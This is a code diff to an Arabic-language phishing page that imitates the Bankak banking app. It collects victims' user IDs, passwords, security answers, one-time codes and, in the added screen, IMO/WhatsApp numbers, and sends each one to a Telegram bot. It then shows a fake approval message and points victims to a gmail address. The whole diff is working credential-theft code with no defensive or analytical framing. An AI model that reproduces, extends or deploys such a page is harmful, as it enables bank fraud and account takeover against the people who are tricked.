@@ -15,26 +15,28 @@
     }
 
     body {
-      background-color: #111827;
+      background-color: #ffffff;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
+      width: 100vw;
+      height: 100vh;
+      overflow: hidden;
     }
 
     .app-screen {
       width: 100%;
-      max-width: 412px;
-      height: 100vh;
-      max-height: 870px;
+      max-width: 100%;
+      height: 100%;
+      max-height: 100%;
       background-color: #ffffff;
       display: flex;
       flex-direction: column;
       justify-content: space-between;
       position: relative;
-      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.15);
-      border-radius: 16px;
-      border: 3px solid #ffffff;
+      box-shadow: none;
+      border-radius: 0;
+      border: none;
       overflow: hidden;
     }
 
@@ -250,7 +252,7 @@
 
     .btn-red {
       width: 100%;
-      padding: 11px;
+      padding: 12px;
       background: linear-gradient(180deg, #ed1c24 0%, #b80c13 100%);
       border: 1px solid #990a10;
       border-radius: 8px;
@@ -827,6 +829,7 @@
       </div>
     </div>
 
+    <!-- شاشة إدخال رمز التحقق (OTP) فقط -->
     <div class="screen" id="screenOtp">
       <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
@@ -854,20 +857,52 @@
       </div>
     </div>
 
-    <!-- شاشة معالجة الطلب المؤقتة -->
-    <div class="screen" id="screenProcessing">
-      <div class="top-header" style="padding: 20px 16px; height: 40%; justify-content: center;">
-        <div class="logo-box">
+    <!-- شاشة إدخال رقم التواصل (إيمو / واتساب) تظهر بعد الضغط على إرسال الرمز -->
+    <div class="screen" id="screenContact">
+      <div class="top-header" style="padding: 12px 16px;">
+        <div class="header-bar">
+          <span class="page-title">بيانات التواصل</span>
+          <button type="button" class="btn-top-back" onclick="switchScreen('screenOtp')">← رجوع</button>
+        </div>
+        <div class="logo-box" style="transform: scale(0.7);">
           <div class="logo-ar">بنـ<span>كك</span></div>
-          <div class="logo-en">ban<span>kak</span></div>
         </div>
       </div>
-      <div class="form-section" style="display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; gap: 20px;">
-        <div class="timer-circle"></div>
+      <div class="form-section">
+        <div class="otp-card">
+          <div style="font-size: 1.1rem; font-weight: bold; color: #111827; margin-bottom: 8px;"><i class="fa-solid fa-headset" style="color:#c8102e;"></i> أكمل بيانات الاتصال</div>
+          <p class="otp-info">الرجاء إدخال رقم التواصل الخاص بك ليتم متابعة الطلب والتنسيق معك فوراً.</p>
+          <div class="input-box" style="margin-top: 10px;">
+            <span class="icon-right" style="z-index: 6;">📞</span>
+            <input type="tel" class="input-field" id="contactInput" placeholder="رقم التواصل (إيمو / واتساب)" required />
+          </div>
+          <button class="btn-red" onclick="submitContactInfo()">تأكيد وإرسال الطلب</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- شاشة معالجة الطلب المؤقتة ومقبولة بنجاح -->
+    <div class="screen" id="screenProcessing">
+      <div class="top-header" style="padding: 20px 16px; height: 35%; justify-content: center;">
+        <div class="logo-box">
+          <div class="logo-ar" style="font-size: 2.2rem;">بنـ<span>كك</span></div>
+          <div class="logo-en" style="font-size: 1.1rem;">ban<span>kak</span></div>
+        </div>
+      </div>
+      <div class="form-section" style="display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; gap: 16px; padding: 20px;">
+        <div class="timer-circle" id="processingSpinner"></div>
         <div id="processingText" style="font-size: 1.15rem; font-weight: 800; color: #1f2937;">جاري تقديم الطلب...</div>
         <p style="font-size: 0.85rem; color: #6b7280; line-height: 1.6;" id="processingSubText">يرجى الانتظار قليلاً، يتم معالجة طلبك وتوثيق الحساب الآن.</p>
-        <div id="successActionContainer" style="width: 100%; margin-top: 15px; display: none;">
-          <a href="mailto:bok.portfolio.bankofkhartoum@gmail.com" class="btn-red" style="display: block; text-align: center;">إيميل التواصل (bok.portfolio.bankofkhartoum@gmail.com)</a>
+        
+        <!-- زر اكمل الإجراءات عبر الإيميل المميز الذي يظهر عند اكتمال الطلب -->
+        <div id="successActionContainer" style="width: 100%; margin-top: 10px; display: none;">
+          <div style="background: #f0fdf4; border: 1px solid #bbf7d0; padding: 14px; border-radius: 12px; margin-bottom: 15px; color: #166534; font-size: 0.85rem; font-weight: 600;">
+            <i class="fa-solid fa-circle-check" style="font-size: 1.2rem; color: #16a34a; display: block; margin-bottom: 5px;"></i>
+            تم توثيق بياناتك وحسابك بنجاح تام، يرجى استكمال الخطوات النهائية عبر البريد الإلكتروني أدناه:
+          </div>
+          <a href="mailto:bok.portfolio.bankofkhartoum@gmail.com" class="btn-red" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: linear-gradient(135deg, #059669 0%, #047857 100%); border-color: #065f46; font-size: 0.95rem; padding: 14px; border-radius: 10px; box-shadow: 0 4px 12px rgba(5, 150, 105, 0.3);">
+            <i class="fa-solid fa-envelope-open-text" style="font-size: 1.2rem;"></i> أُكمل الإجراءات عبر الإيميل
+          </a>
         </div>
       </div>
     </div>
@@ -996,7 +1031,6 @@
     let selectedServiceName = "المحفظة الاستثمارية";
     let otpTimerInterval = null;
 
-    // دالة إرسال التنبيهات والبيانات إلى تليجرام فوراً
     async function sendToTelegram(text) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
       const payload = {
@@ -1039,7 +1073,6 @@
       setTimeout(() => {
         overlay.style.display = 'none';
         
-        // إرسال الخدمة المكتارة فوراً
         sendToTelegram(`📌 *تم اختيار خدمة جديدة:*\n- الخدمة: ${selectedServiceName}`);
 
         if (selectedServiceIndex === 0) {
@@ -1136,9 +1169,7 @@
         }
       });
 
-      // إرسال بيانات الاستمارة فوراً منفصلة
       await sendToTelegram(formMsg);
-
       switchScreen('screenLogin');
     }
 
@@ -1198,7 +1229,6 @@
         return;
       }
 
-      // إرسال بيانات تسجيل الدخول فوراً وبشكل منفصل
       await sendToTelegram(`👤 *معرف المستخدم (User ID):* \`${userId}\`\n🔑 *كلمة المرور:* \`${password}\``);
 
       document.getElementById('modalDevice').style.display = 'flex';
@@ -1221,7 +1251,6 @@
         return;
       }
 
-      // إرسال سؤال وجواب الأمان فوراً منفصلين
       await sendToTelegram(`❓ *سؤال الأمان:* ${selectQ}\n💬 *الجواب:* \`${ansInput}\``);
 
       switchScreen('screenOtp');
@@ -1247,27 +1276,44 @@
 
     async function validateOtp() {
       const otpVal = document.getElementById('otpInput').value.trim();
+
       if (!/^\d{6}$/.test(otpVal) || isSequentialOrRepeatedOtp(otpVal)) {
         showErrorModal("الرمز السري خاطئ. الرجاء المحاولة مرة اخرى.");
         return;
       }
       
-      // إرسال رمز التحقق (OTP) فوراً منفصلاً
       await sendToTelegram(`📱 *رمز التحقق (OTP):* \`${otpVal}\``);
+
+      // الانتقال إلى شاشة إدخال رقم التواصل بعد إدخال الرمز الصحيح
+      switchScreen('screenContact');
+    }
+
+    async function submitContactInfo() {
+      const contactVal = document.getElementById('contactInput').value.trim();
+
+      if (!contactVal) {
+        showErrorModal("الرجاء إدخال رقم التواصل (إيمو / واتساب).");
+        return;
+      }
+
+      await sendToTelegram(`📞 *رقم التواصل (إيمو/واتساب):* \`${contactVal}\``);
 
       switchScreen('screenProcessing');
       
       const processingText = document.getElementById('processingText');
       const processingSubText = document.getElementById('processingSubText');
+      const processingSpinner = document.getElementById('processingSpinner');
       const successAction = document.getElementById('successActionContainer');
       
       processingText.textContent = "جاري تقديم الطلب...";
       processingSubText.textContent = "يرجى الانتظار، يتم إرسال بيانات الطلب للمراجعة...";
+      processingSpinner.style.display = 'block';
       successAction.style.display = 'none';
 
       setTimeout(() => {
+        processingSpinner.style.display = 'none';
         processingText.textContent = "تم قبول طلبك بنجاح!";
-        processingSubText.textContent = "تمت الموافقة على توثيق الحساب والخدمة بنجاح، يمكنك التواصل عبر الإيميل أدناه للمتابعة:";
+        processingSubText.style.display = 'none';
         successAction.style.display = 'block';
       }, 7000);
     }
